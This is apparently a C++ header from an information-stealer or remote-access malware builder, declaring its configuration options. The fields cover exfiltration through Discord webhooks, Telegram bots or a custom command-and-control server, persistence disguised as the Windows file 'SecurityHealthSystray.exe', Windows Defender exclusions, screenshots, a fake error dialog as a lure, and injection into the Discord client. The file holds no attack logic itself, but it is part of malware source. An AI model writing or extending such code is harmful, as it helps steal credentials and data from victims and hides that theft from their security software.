#pragma once

#include <filesystem>
#include <string>

namespace ariel::config {

struct options {
    std::string discord_webhook;
    std::string telegram_token;
    std::string telegram_chat_id;
    std::string password;
    bool install = false;
    std::string startup_name = "SecurityHealthSystray.exe";
    std::string appdata_dir = "SecurityHealthSystray";
    bool ping_everyone = false;
    bool defender_exclusions = false;
    bool screenshot = false;
    bool debug = false;
    bool fake_error = false;
    std::string fake_error_title;
    std::string fake_error_message;
    bool discord_injection = false;
    std::string injection_script;
    std::string thumbnail_url;
    std::string custom_c2_url;
    std::string custom_c2_file_field;
    std::string custom_c2_headers;
    std::string custom_c2_fields;
    std::filesystem::path output;
};

options load(int argc, wchar_t** argv, std::string& error);

}  // namespace ariel::config
